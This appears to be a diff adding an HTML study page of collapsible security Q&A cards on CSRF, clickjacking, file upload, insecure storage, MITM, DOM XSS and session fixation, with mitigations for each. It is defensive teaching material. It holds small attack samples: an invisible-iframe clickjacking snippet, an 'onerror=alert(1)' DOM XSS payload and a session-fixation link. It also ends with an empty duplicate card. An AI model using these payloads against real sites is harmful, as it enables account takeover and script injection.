+  <p>Cross-Site Request Forgery (CSRF) is an attack where a malicious actor tricks a victim into performing unwanted actions on a web application in which they are authenticated, potentially compromising the victim's data or account.</p>
+
+  <h5 style="background-color: #eccdcf;">How/Where to Detect</h5>
+  <ul>
+    <li><strong>Missing Anti-CSRF Tokens</strong>: Check if the application lacks anti-CSRF tokens for state-changing requests (e.g., form submissions, HTTP POST requests).</li>
+    <li><strong>Unprotected Sensitive Operations</strong>: Test for unprotected actions like password changes or transferring funds that can be triggered by GET or POST requests without additional validation.</li>
+    <li><strong>Referer Header Analysis</strong>: Examine if the application is vulnerable by allowing requests from any origin without verifying the Referer header.</li>
+    <li><strong>Cookie Behavior</strong>: Check if sensitive actions are not protected by proper session validation, especially if cookies are used without secure flags.</li>
+  </ul>
+
+  <h5 style="background-color: #eccdcf;">Mitigation</h5>
+  <ul>
+    <li><strong>Use Anti-CSRF Tokens</strong>: Include unique, unpredictable tokens in each request to verify the authenticity of the source (e.g., using a hidden field in forms).</li>
+    <li><strong>SameSite Cookies</strong>: Set the SameSite cookie attribute to **Strict** or **Lax** to prevent cookies from being sent with cross-site requests.</li>
+    <li><strong>Validate the Referer Header</strong>: Ensure that requests come from a trusted source by checking the Referer header before performing sensitive actions.</li>
+    <li><strong>Use Secure HTTP Methods</strong>: Use **POST** for state-changing requests and **GET** only for retrieving data, avoiding state-altering actions with GET requests.</li>
+    <li><strong>Double Submit Cookies</strong>: Implement double-submit cookies where the client sends a cookie and a token in the request body, which the server validates to ensure authenticity.</li>
+  </ul>
+
+  <h5 style="background-color: #eccdcf;">Types</h5>
+  <ul>
+    <li><strong>State-Changing CSRF</strong>: Involves an attacker causing the victim to perform actions that change the state of the application, such as transferring money, changing account details, etc.</li>
+    <li><strong>Data-Exfiltration CSRF</strong>: Triggers actions that expose or leak sensitive data to an external attacker, typically without the victim noticing.</li>
+    <li><strong>Login CSRF</strong>: Targets login processes where an attacker might force the victim to perform actions such as logging into an account via a crafted request.</li>
+  </ul>
+
+  <h5 style="background-color: #eccdcf;">Example</h5>
+  <ul>
+    <li><strong>Bank Transfer CSRF</strong>: An attacker sends a link to a victim that, when clicked, transfers money from the victim's account to the attacker's account without the victim's knowledge or consent.</li>
+    <li><strong>Password Change CSRF</strong>: An attacker sends a link that causes the victim to change their account password, enabling the attacker to take control of the victim's account.</li>
+  </ul>
+
+  <h5 style="background-color: #eccdcf;">HTTP Security Header</h5>
+  <ul>
+    <li><strong>SameSite Cookie Attribute</strong>: Use the **SameSite** attribute to limit cookie transmission to same-origin requests, helping mitigate CSRF by preventing the browser from sending cookies on cross-origin requests.</li>
+    <li><strong>Strict-Transport-Security (HSTS)</strong>: Ensures that all communication occurs over HTTPS, which reduces the chance of a CSRF attack being intercepted via a man-in-the-middle (MITM) attack.</li>
+  </ul>
+</div>
+
+
+<div class="q">Clickjacking</div>
+<div class="a">
+  <h5 style="background-color: #eccdcf;">Definition</h5>
+  <p>Clickjacking tricks users into clicking hidden malicious links by embedding a legitimate site in an invisible iframe.</p>
+
+  <h5 style="background-color: #eccdcf;">How/Where to Detect</h5>
+  <p>Test if your site can be embedded in iframes from external domains.</p>
+
+  <h5 style="background-color: #eccdcf;">Mitigation</h5>
+  <ul>
+    <li><code>X-Frame-Options: deny</code> or <code>sameorigin</code></li>
+    <li><code>CSP: frame-ancestors 'self';</code></li>
+  </ul>
+
+  <h5 style="background-color: #eccdcf;">Types</h5>
+  <ul>
+    <li>UI Redressing</li>
+    <li>Mouse-Tracking Clickjacking</li>
+  </ul>
+
+  <h5 style="background-color: #eccdcf;">Example</h5>
+  <pre>&lt;iframe src="target-site" style="opacity: 0; position: absolute; top: 0; left: 0; width: 100%; height: 100%;"&gt;&lt;/iframe&gt;</pre>
+
+  <h5 style="background-color: #eccdcf;">Clickjacking vs CSRF</h5>
+  <p>Clickjacking: user clicks an element unknowingly. CSRF: attacker forges a request.</p>
+
+  <h5 style="background-color: #eccdcf;">Attack Scenario</h5>
+  <pre>&lt;iframe src="target-site" style="opacity: 0; position: absolute;"&gt;&lt;/iframe&gt;</pre>
+
+  <h5 style="background-color: #eccdcf;">Combining with DOM XSS</h5>
+  <p>Clickjacking can trigger a DOM XSS attack when the iframe runs malicious scripts.</p>
+
+  <h5 style="background-color: #eccdcf;">HTTP Security Header</h5>
+  <p>Use <code>X-Frame-Options</code> or <code>CSP</code> to prevent iframe embedding.</p>
+</div>
+
+
+
+<div class="q">File Upload</div>
+<div class="a">
+  <h5 style="background-color: #eccdcf;">Definition</h5>
+  <p>File upload allows users to send files to the server. However, it can be exploited if not properly handled, leading to issues like the upload of malicious files (e.g., scripts or executables) or large files causing denial of service.</p>
+
+  <h5 style="background-color: #eccdcf;">How/Where to Detect</h5>
+  <p>File upload vulnerabilities can be detected by reviewing the file upload functionality for improper validation of file types, extensions, and sizes. Tools like static analysis or fuzz testing can also identify potential flaws.</p>
+
+  <h5 style="background-color: #eccdcf;">Mitigation</h5>
+  <ul>
+    <li>Validate the file type and extension on the server-side.</li>
+    <li>Use file size limits to prevent denial-of-service attacks.</li>
+    <li>Store files outside the web root to prevent execution.</li>
+    <li>Rename uploaded files to prevent overwriting existing files.</li>
+    <li>Ensure that the file does not contain executable content (e.g., scripts, executables).</li>
+  </ul>
+
+  <h5 style="background-color: #eccdcf;">Types</h5>
+  <ul>
+    <li>Image Upload</li>
+    <li>Document Upload (PDF, Word, etc.)</li>
+    <li>Audio/Video Upload</li>
+    <li>Code/Script Upload (Malicious Files)</li>
+  </ul>
+
+  <h5 style="background-color: #eccdcf;">Example</h5>
+  <p>Example of a vulnerable file upload form:</p>
+  <pre>
+    <form action="/upload" method="POST" enctype="multipart/form-data">
+      <input type="file" name="userfile">
+      <input type="submit" value="Upload">
+    </form>
+  </pre>
+  <p>Without proper validation, an attacker could upload a malicious file (e.g., a PHP web shell) to gain control over the server.</p>
+
+  <h5 style="background-color: #eccdcf;">HTTP Security Header</h5>
+  <p>No specific HTTP header for file upload security, but headers like <code>X-Content-Type-Options: nosniff</code> can help prevent MIME sniffing and <code>Content-Security-Policy</code> headers can restrict where scripts can be loaded from.</p>
+</div>
+
+
+
+<div class="q">Insecure Storage</div>
+<div class="a">
+  <h5 style="background-color: #eccdcf;">Definition</h5>
+  <p>Insecure Storage occurs when sensitive data (like passwords, tokens, personal info) is stored without proper protection, making it easy for attackers to access or steal.</p>
+
+  <h5 style="background-color: #eccdcf;">How/Where to Detect</h5>
+  <ul>
+    <li>Analyze database storage for plaintext credentials or sensitive data.</li>
+    <li>Check mobile apps for unencrypted storage in local files, SQLite, or SharedPreferences.</li>
+    <li>Perform file system analysis for exposed credentials, tokens, or config files.</li>
+    <li>Use static and dynamic code analysis to find insecure storage patterns.</li>
+  </ul>
+
+  <h5 style="background-color: #eccdcf;">Mitigation</h5>
+  <ul>
+    <li>Always encrypt sensitive data at rest using strong encryption (e.g., AES-256).</li>
+    <li>Store only what's strictly necessary.</li>
+    <li>Use hashing (with salt) for passwords (e.g., bcrypt, Argon2).</li>
+    <li>Apply secure key management practices—never hardcode keys or secrets.</li>
+    <li>Implement access controls to prevent unauthorized access to stored data.</li>
+  </ul>
+
+  <h5 style="background-color: #eccdcf;">Types</h5>
+  <ul>
+    <li><strong>Plaintext Passwords</strong>: Storing passwords without encryption or hashing.</li>
+    <li><strong>Unencrypted Local Storage</strong>: Sensitive data saved unprotected on devices or servers.</li>
+    <li><strong>Hardcoded Secrets</strong>: Credentials or API keys embedded directly in source code.</li>
+    <li><strong>Improper Key Management</strong>: Weak or exposed encryption keys.</li>
+  </ul>
+
+  <h5 style="background-color: #eccdcf;">Example</h5>
+  <ul>
+    <li>An app stores user passwords in plaintext in a database, which gets leaked—exposing all user credentials.</li>
+    <li>A mobile app saves API tokens in SharedPreferences without encryption, which can be accessed on rooted devices.</li>
+  </ul>
+
+  <h5 style="background-color: #eccdcf;">HTTP Security Header</h5>
+  <ul>
+    <li><strong>Strict-Transport-Security (HSTS)</strong>: Ensures data is transmitted securely over HTTPS.</li>
+    <li><strong>Content-Security-Policy (CSP)</strong>: Helps reduce data exfiltration via XSS that could expose stored data.</li>
+    <li><strong>Cache-Control</strong>: Prevents caching of sensitive information in browsers or proxies.</li>
+  </ul>
+</div>
+
+
+
+<div class="q">Man-in-the-Middle (MITM) Attacks</div>
+<div class="a">
+  <h5 style="background-color: #eccdcf;">Definition</h5>
+  <p>MITM attacks occur when an attacker intercepts and potentially alters communication between two parties without their knowledge.</p>
+
+  <h5 style="background-color: #eccdcf;">How/Where to Detect</h5>
+  <ul>
+    <li>Monitor for unusual TLS certificate changes or untrusted certs.</li>
+    <li>Use packet sniffers (e.g., Wireshark) to detect traffic interception.</li>
+    <li>Detect unexpected proxies or rogue Wi-Fi access points.</li>
+    <li>Analyze logs for anomalies in session tokens or login patterns.</li>
+  </ul>
+
+  <h5 style="background-color: #eccdcf;">Mitigation</h5>
+  <ul>
+    <li>Use HTTPS everywhere with valid SSL/TLS certificates.</li>
+    <li>Implement HSTS to force secure connections.</li>
+    <li>Validate SSL certificates and reject self-signed ones.</li>
+    <li>Avoid public/untrusted Wi-Fi or use VPNs on them.</li>
+    <li>Use DNSSEC and secure DNS resolvers.</li>
+  </ul>
+
+  <h5 style="background-color: #eccdcf;">Types</h5>
+  <ul>
+    <li><strong>HTTPS Spoofing</strong>: Faking secure sites to trick users.</li>
+    <li><strong>Wi-Fi Eavesdropping</strong>: Intercepting data on unsecured Wi-Fi networks.</li>
+    <li><strong>Session Hijacking</strong>: Stealing session cookies to impersonate users.</li>
+    <li><strong>DNS Spoofing</strong>: Redirecting traffic to malicious sites.</li>
+    <li><strong>Email Hijacking</strong>: Intercepting communications to manipulate message contents.</li>
+  </ul>
+
+  <h5 style="background-color: #eccdcf;">Example</h5>
+  <ul>
+    <li>User logs into a banking site on a public Wi-Fi; an attacker intercepts the session and captures login credentials.</li>
+  </ul>
+
+  <h5 style="background-color: #eccdcf;">HTTP Security Header</h5>
+  <ul>
+    <li><strong>Strict-Transport-Security (HSTS)</strong>: Forces browsers to use HTTPS, preventing downgrade attacks.</li>
+    <li><strong>Public-Key-Pins (Deprecated)</strong>: Previously used to prevent fake certificate use.</li>
+    <li><strong>Content-Security-Policy (CSP)</strong>: Can help prevent malicious scripts from running during interception.</li>
+  </ul>
+</div>
+
+<div class="q">DOM-based</div>
+<div class="a">
+  <h5 style="background-color: #eccdcf;">Definition</h5>
+  <p>DOM-based XSS occurs when the client-side JavaScript modifies the DOM using unsanitized user input, leading to script execution in the browser.</p>
+
+  <h5 style="background-color: #eccdcf;">How/Where to Detect</h5>
+  <ul>
+    <li>Analyze JavaScript code for use of `document.location`, `innerHTML`, `document.write`, etc., with user input.</li>
+    <li>Use browser dev tools or tools like DOM Invader (Burp Suite).</li>
+    <li>Test URL fragments, query strings, and parameters affecting the DOM.</li>
+  </ul>
+
+  <h5 style="background-color: #eccdcf;">Mitigation</h5>
+  <ul>
+    <li>Avoid using `innerHTML`, `eval()`, or `document.write()` with user input.</li>
+    <li>Use proper client-side input validation and output encoding.</li>
+    <li>Sanitize data before inserting it into the DOM.</li>
+    <li>Use libraries that automatically escape content (e.g., React).</li>
+  </ul>
+
+  <h5 style="background-color: #eccdcf;">Types</h5>
+  <ul>
+    <li><strong>DOM-based XSS via URL parameters</strong></li>
+    <li><strong>DOM-based XSS via location.hash</strong></li>
+    <li><strong>DOM-based XSS via postMessage()</strong></li>
+  </ul>
+
+  <h5 style="background-color: #eccdcf;">Example</h5>
+  <ul>
+    <li><code>&lt;script&gt;document.getElementById("output").innerHTML = location.hash;&lt;/script&gt;</code></li>
+    <li>Visiting: <code>example.com/page.html#&lt;img src=x onerror=alert(1)&gt;</code></li>
+  </ul>
+
+  <h5 style="background-color: #eccdcf;">HTTP Security Header</h5>
+  <ul>
+    <li><strong>Content-Security-Policy (CSP)</strong>: Restricts sources of scripts and helps block XSS.</li>
+    <li><strong>X-XSS-Protection</strong> (legacy): Can block some reflective XSS, but not DOM-based.</li>
+  </ul>
+</div>
+
+<div class="q">Session Fixation</div>
+<div class="a">
+  <h5 style="background-color: #eccdcf;">Definition</h5>
+  <p>Session Fixation is a vulnerability where an attacker sets or predicts a user's session ID before login, allowing them to hijack the session after authentication.</p>
+
+  <h5 style="background-color: #eccdcf;">How/Where to Detect</h5>
+  <ul>
+    <li>Check if session ID remains the same before and after login.</li>
+    <li>Test if session ID can be set via URL, cookie, or headers.</li>
+    <li>Analyze authentication flow for lack of session regeneration.</li>
+  </ul>
+
+  <h5 style="background-color: #eccdcf;">Mitigation</h5>
+  <ul>
+    <li>Always regenerate session ID after login.</li>
+    <li>Set session cookies with <code>HttpOnly</code>, <code>Secure</code>, and <code>SameSite</code> flags.</li>
+    <li>Use short session expiration and logout mechanisms.</li>
+    <li>Block session ID from being passed in URLs.</li>
+  </ul>
+
+  <h5 style="background-color: #eccdcf;">Types</h5>
+  <ul>
+    <li><strong>Session ID in URL</strong>: ID passed via query string.</li>
+    <li><strong>Session ID in hidden fields</strong>: Used in POST forms.</li>
+    <li><strong>Session ID via cookie manipulation</strong>.</li>
+  </ul>
+
+  <h5 style="background-color: #eccdcf;">Example</h5>
+  <ul>
+    <li>Attacker sends a link like <code>example.com/login?sessionid=abc123</code>. After victim logs in, attacker reuses <code>abc123</code> to access the session.</li>
+  </ul>
+
+  <h5 style="background-color: #eccdcf;">HTTP Security Header</h5>
+  <ul>
+    <li><strong>Set-Cookie: HttpOnly; Secure; SameSite=Strict</strong></li>
+    <li><strong>Strict-Transport-Security (HSTS)</strong>: Enforces HTTPS to protect cookies.</li>
+  </ul>
+</div>
+
+
+
+                <div class="q">Session Fixation	</div>
+                <div class="a">
+                  <h5 style="background-color: #eccdcf;">Definition</h5>
+                  <h5 style="background-color: #eccdcf;">How/Where to Detect   </h5>
+                  <h5 style="background-color: #eccdcf;">Mitigation</h5>
+                  <h5 style="background-color: #eccdcf;">Types</h5>
+                  <h5 style="background-color: #eccdcf;">Example</h5>
+                  <h5 style="background-color: #eccdcf;">HTTP Security Header</h5>
+                </div>
+
+
+            </div>
+        </div>
+    </div>
+
+
+    <script>
+      // Seleciona todas as perguntas com a classe .q
+      const questions = document.querySelectorAll('.q');
+
+      // Para cada pergunta, adiciona o evento de clique
+      questions.forEach((question) => {
+        question.addEventListener('click', function() {
+          // Encontra a resposta relacionada (a próxima div com a classe .a)
+          const answer = this.nextElementSibling;
+          
+          // Alterna a visibilidade da resposta
+          if (answer && answer.classList.contains('a')) {
+            answer.style.display = answer.style.display === 'block' ? 'none' : 'block';
+          }
+        });
+      });
+      </script>
+    <script src="js/jquery.min.js"></script>
+    <script src="js/popper.js"></script>
+    <script src="js/bootstrap.min.js"></script>
+    <script src="js/main.js"></script>
+</body>
+</html>
